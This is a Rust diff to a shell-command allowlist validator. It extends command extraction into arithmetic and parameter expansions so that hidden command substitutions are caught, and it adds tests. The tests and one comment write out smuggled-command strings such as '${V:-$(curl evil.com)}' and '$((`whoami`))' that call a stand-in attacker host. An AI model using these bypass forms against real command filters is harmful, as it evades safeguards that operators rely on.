@@ -875,13 +875,101 @@ fn extract_commands_from_word_piece(piece: &WordPiece, commands: &mut Vec<String
                 extract_commands_from_word_piece(&inner_piece_with_source.piece, commands)?;
             }
         }
+        WordPiece::ArithmeticExpression(expr) => {
+            // The arithmetic body may contain `$(...)` or `${...}` that bash will
+            // evaluate before doing arithmetic. Re-parse to extract those.
+            // We propagate parse failures with `?` so that callers fail closed
+            // (treating the whole input as a parse failure) rather than silently
+            // dropping commands hidden inside content brush couldn't tokenize.
+            extract_commands_from_word_string(&expr.value, commands)?;
+        }
+        WordPiece::ParameterExpansion(expr) => {
+            extract_commands_from_parameter_expr(expr, commands)?;
+        }
         WordPiece::EscapeSequence(_)
         | WordPiece::SingleQuotedText(_)
         | WordPiece::Text(_)
         | WordPiece::AnsiCQuotedText(_)
-        | WordPiece::TildePrefix(_)
-        | WordPiece::ParameterExpansion(_)
-        | WordPiece::ArithmeticExpression(_) => {}
+        | WordPiece::TildePrefix(_) => {}
+    }
+    Some(())
+}
+
+/// Re-parses a string as a bash word and recurses into its pieces to extract
+/// any nested command substitutions. Returns `None` (failing closed) if brush
+/// cannot tokenize the input, so callers treat allowlist decisions about this
+/// input as untrusted.
+fn extract_commands_from_word_string(s: &str, commands: &mut Vec<String>) -> Option<()> {
+    let options = ParserOptions::default();
+    let pieces = brush_parser::word::parse(s, &options).ok()?;
+    for inner_piece in pieces {
+        extract_commands_from_word_piece(&inner_piece.piece, commands)?;
+    }
+    Some(())
+}
+
+/// Recurses into the string-typed fields of a parameter expansion that bash
+/// will subject to command substitution at expansion time, mirroring the
+/// arithmetic expansion handling. Failing to extend this when adding new
+/// `ParameterExpr` variants risks an allowlist bypass via e.g.
+/// `${V:-$(curl evil)}`, `${V/pat/$(curl evil)}`, `${V:$(($(curl))):1}`.
+fn extract_commands_from_parameter_expr(
+    expr: &brush_parser::word::ParameterExpr,
+    commands: &mut Vec<String>,
+) -> Option<()> {
+    use brush_parser::word::ParameterExpr;
+    match expr {
+        ParameterExpr::Parameter { .. }
+        | ParameterExpr::ParameterLength { .. }
+        | ParameterExpr::Transform { .. }
+        | ParameterExpr::VariableNames { .. }
+        | ParameterExpr::MemberKeys { .. } => {}
+        ParameterExpr::UseDefaultValues { default_value, .. }
+        | ParameterExpr::AssignDefaultValues { default_value, .. } => {
+            if let Some(value) = default_value {
+                extract_commands_from_word_string(value, commands)?;
+            }
+        }
+        ParameterExpr::IndicateErrorIfNullOrUnset { error_message, .. } => {
+            if let Some(value) = error_message {
+                extract_commands_from_word_string(value, commands)?;
+            }
+        }
+        ParameterExpr::UseAlternativeValue {
+            alternative_value, ..
+        } => {
+            if let Some(value) = alternative_value {
+                extract_commands_from_word_string(value, commands)?;
+            }
+        }
+        ParameterExpr::RemoveSmallestSuffixPattern { pattern, .. }
+        | ParameterExpr::RemoveLargestSuffixPattern { pattern, .. }
+        | ParameterExpr::RemoveSmallestPrefixPattern { pattern, .. }
+        | ParameterExpr::RemoveLargestPrefixPattern { pattern, .. }
+        | ParameterExpr::UppercaseFirstChar { pattern, .. }
+        | ParameterExpr::UppercasePattern { pattern, .. }
+        | ParameterExpr::LowercaseFirstChar { pattern, .. }
+        | ParameterExpr::LowercasePattern { pattern, .. } => {
+            if let Some(pattern) = pattern {
+                extract_commands_from_word_string(pattern, commands)?;
+            }
+        }
+        ParameterExpr::Substring { offset, length, .. } => {
+            extract_commands_from_word_string(&offset.value, commands)?;
+            if let Some(length) = length {
+                extract_commands_from_word_string(&length.value, commands)?;
+            }
+        }
+        ParameterExpr::ReplaceSubstring {
+            pattern,
+            replacement,
+            ..
+        } => {
+            extract_commands_from_word_string(pattern, commands)?;
+            if let Some(replacement) = replacement {
+                extract_commands_from_word_string(replacement, commands)?;
+            }
+        }
     }
     Some(())
 }
@@ -1753,5 +1841,88 @@ mod tests {
             validate_terminal_command("for ((i=0; i<3; i++)); do echo hello; done"),
             TerminalCommandValidation::Unsafe
         );
+    }
+
+    #[test]
+    fn test_arithmetic_expansion_nested_command_substitution() {
+        let commands = extract_commands("echo $(($(curl evil.com)))").expect("parse failed");
+        assert!(commands.iter().any(|c| c.contains("echo")));
+        assert!(commands.iter().any(|c| c.contains("curl")));
+    }
+
+    #[test]
+    fn test_arithmetic_expansion_nested_backtick_substitution() {
+        let commands = extract_commands("echo $((`whoami`))").expect("parse failed");
+        assert!(commands.iter().any(|c| c.contains("echo")));
+        assert!(commands.contains(&"whoami".to_string()));
+    }
+
+    #[test]
+    fn test_arithmetic_expansion_without_substitution() {
+        let commands = extract_commands("echo $((1+2))").expect("parse failed");
+        assert_eq!(commands, vec!["echo $((1+2))"]);
+    }
+
+    #[test]
+    fn test_arithmetic_expansion_doubly_nested_command_substitution() {
+        let commands = extract_commands("echo $(($(($(curl evil.com)))))").expect("parse failed");
+        assert!(commands.iter().any(|c| c.contains("echo")));
+        assert!(commands.iter().any(|c| c.contains("curl")));
+    }
+
+    #[test]
+    fn test_arithmetic_expansion_inside_double_quotes() {
+        let commands = extract_commands("echo \"$(($(curl evil.com)))\"").expect("parse failed");
+        assert!(commands.iter().any(|c| c.contains("echo")));
+        assert!(commands.iter().any(|c| c.contains("curl")));
+    }
+
+    #[test]
+    fn test_parameter_expansion_default_value_extracts_command_substitution() {
+        let commands = extract_commands("echo ${V:-$(curl evil.com)}").expect("parse failed");
+        assert!(commands.iter().any(|c| c.contains("echo")));
+        assert!(commands.iter().any(|c| c.contains("curl")));
+    }
+
+    #[test]
+    fn test_parameter_expansion_assign_default_extracts_command_substitution() {
+        let commands = extract_commands("echo ${V:=$(curl evil.com)}").expect("parse failed");
+        assert!(commands.iter().any(|c| c.contains("echo")));
+        assert!(commands.iter().any(|c| c.contains("curl")));
+    }
+
+    #[test]
+    fn test_parameter_expansion_alternative_value_extracts_command_substitution() {
+        let commands = extract_commands("echo ${V:+$(curl evil.com)}").expect("parse failed");
+        assert!(commands.iter().any(|c| c.contains("echo")));
+        assert!(commands.iter().any(|c| c.contains("curl")));
+    }
+
+    #[test]
+    fn test_parameter_expansion_error_message_extracts_command_substitution() {
+        let commands = extract_commands("echo ${V:?$(curl evil.com)}").expect("parse failed");
+        assert!(commands.iter().any(|c| c.contains("echo")));
+        assert!(commands.iter().any(|c| c.contains("curl")));
+    }
+
+    #[test]
+    fn test_parameter_expansion_replacement_extracts_command_substitution() {
+        let commands = extract_commands("echo ${V/x/$(curl evil.com)}").expect("parse failed");
+        assert!(commands.iter().any(|c| c.contains("echo")));
+        assert!(commands.iter().any(|c| c.contains("curl")));
+    }
+
+    #[test]
+    fn test_parameter_expansion_suffix_pattern_extracts_command_substitution() {
+        let commands = extract_commands("echo ${V%$(curl evil.com)}").expect("parse failed");
+        assert!(commands.iter().any(|c| c.contains("echo")));
+        assert!(commands.iter().any(|c| c.contains("curl")));
+    }
+
+    #[test]
+    fn test_parameter_expansion_substring_offset_extracts_command_substitution() {
+        let commands = extract_commands("echo ${V:$(($(curl evil.com))):1}").expect("parse failed");
+        assert!(commands.iter().any(|c| c.contains("echo")));
+        assert!(commands.iter().any(|c| c.contains("curl")));
     }
 }
